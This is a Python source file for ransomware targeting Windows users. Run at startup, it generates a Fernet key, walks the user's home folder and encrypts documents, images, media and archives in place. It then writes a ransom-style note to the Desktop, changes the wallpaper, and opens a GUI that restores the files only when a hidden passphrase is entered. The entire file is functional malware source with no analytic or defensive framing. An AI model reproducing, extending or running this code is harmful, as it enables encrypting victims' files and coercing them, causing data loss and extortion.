from cryptography.fernet import Fernet
import os
import sys
import base64
import getpass
import customtkinter
from PIL import ImageTk, Image
import ctypes


# GET SYSTEM'S HOSTNAME
SYSTEM_USER = getpass.getuser()

SPI_SETDESKWALLPAPER = 20

# FILE EXTENSION
ALLOWED_FORMAT = [
                  'jpg', 'txt', 'docx', 'zip', 'doc', '.tml', 'htm', 'odt', 'pdf', 'xls', 'xlsx',
                  'ods', 'ppt', 'pptx', 'png', 'gif', 'jpeg', 'psd', 'ai', 'eps', 'mp3', 'mp4', 'wav',
                  'm4a', 'mov', 'avi', 'mwv', 'webm', 'tar'
                  ]

# IGNORE FILES
IGNORE = ["message.txt", "Documents(1).txt", "haha.png"]

KEY_DIR =f"C:\\Users\\{ SYSTEM_USER }\\Documents\\Documents(1).txt"

# CHECK FILE WETHER IT'S IN ALLOWED LIST
def check_if_file_allowed(file_path):
    file_ext = file_path.split('.')[-1]
    return True if file_ext in ALLOWED_FORMAT else False

# SET THE WALLPAPER
def set_wallpaper(image_path):
    absolute_path = os.path.abspath(image_path)
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, absolute_path, 3)
    

# DETERMINE OS
def determine_os():
    if os.name == 'nt':
        return "Windows"
    elif os.name == "posix":
        if os.uname().sysname == "Linux":
            return "Linux"
        else:
            return "MacOs"


# GENERATE KEY
def generate_key():
    with open( KEY_DIR, 'wb') as file:
        file.write(Fernet.generate_key())


# LOAD THE KEY
def load_file(filename):
    return open(filename, 'rb').read()


# ENCRYPTION
def encrypt_file(filename, key):
    f = Fernet(key)
    with open(filename, 'rb') as file:
        file_data = file.read()

    encrypted_data = f.encrypt(file_data)

    with open(filename, 'wb') as file:
        file.write(encrypted_data)

# DECRYPTION
def decrypt_file(filename, key):
    f = Fernet(key)

    with open(filename, 'rb') as file:
        encrypted_data = file.read()

    decrypted_data = f.decrypt(encrypted_data)

    with open(filename, 'wb') as file:
        file.write(decrypted_data)
    
    
# START ENCRYPTION PROCESS                
def encryption_start():
    # GET THE OS TYPE
    GET_OS = determine_os()

    if GET_OS == "Windows":
        # GENERATE KEY
        generate_key()
        
        load_key_file = load_file(KEY_DIR)

        # START ENCRYPTION
        for root, folder, files in os.walk(f'C:\\Users\\{ SYSTEM_USER }\\'):
            for filename in files:
                try:
                    if filename not in IGNORE and check_if_file_allowed(filename):
                        file_name = (f'{root}\{ filename }')
                        encrypt_file(file_name, load_key_file)
                    else:
                        continue
                except Exception as e:
                    continue

        # CREATE A MESSAGE TEXT FILE
        for root, folder, files in os.walk(f'C:\\Users\\{ SYSTEM_USER }\\'):
            if "desktop" in folder or "Desktop" in folder:
                desktop_path = f"{root}\\Desktop\\message.txt"

                with open(desktop_path, 'w') as file:
                    file.write("Your files are Encrypted. ")
        

# START DECRYPTION PROCESS
def decryption_start():
    # GET THE OS TYPE
    GET_OS = determine_os()

    if GET_OS == "Windows":
    
        load_key_file = load_file(KEY_DIR)

        # START DECRYPTION
        for root, folder, files in os.walk(f'C:\\Users\\{ SYSTEM_USER }\\'):
            for filename in files:
                try:
                    if filename not in IGNORE and check_if_file_allowed(filename):
                        file_name = (f'{root}\{filename}')
                        decrypt_file(file_name, load_key_file)
                    else:
                        continue
                except Exception as e:
                    continue

    # DELETE A MESSAGE TEXT FILE
    for root, folder, files in os.walk(f'C:\\Users\\{ SYSTEM_USER }\\'):
        if "desktop" in folder or "Desktop" in folder:
            desktop_path = f"{root}\\Desktop\\message.txt"
            os.remove(desktop_path)
    
    os.remove(KEY_DIR)

if not os.path.exists(KEY_DIR):
    encryption_start()
    set_wallpaper("wallpaper.jpg")
    
NOTHING = "SGVsbG8hIEknYW0gT2htc1gsIEZVQ0sgVU5JVkVSU0lUSUVTLi4u"

def get_value():
    value = key_input.get()
    
    base64_bytes = value.encode("ascii")

    key_bytes = base64.b64encode(base64_bytes)
    encoded_key = key_bytes.decode("ascii")

    if encoded_key == NOTHING:
        display_res.configure(text="Decryption process start...")
        decryption_start()
        sys.exit()
    else:
        display_res.configure(text="Invalid Key. Please Try Again")

app = customtkinter.CTk()
app.title("Message")
app.geometry("700x350")
app.resizable(0,0)
customtkinter.set_appearance_mode("Dark")

image = customtkinter.CTkImage(Image.open("haha.png"), size=(150, 150))
image_label = customtkinter.CTkLabel(app,text="", image=image, pady=10)
image_label.pack(pady=5)
    
text = customtkinter.CTkLabel(app, text= "All files on your computer have been encrypted\nPlease type the key to start the decryption process")
text.pack(pady=5)

key_input = customtkinter.CTkEntry(app)
key_input.pack()

submit_btn = customtkinter.CTkButton(app, text="Submit", command=get_value)
submit_btn.pack(pady=10)

display_res = customtkinter.CTkLabel(app, text="")
display_res.pack(pady=8)

app.mainloop()        
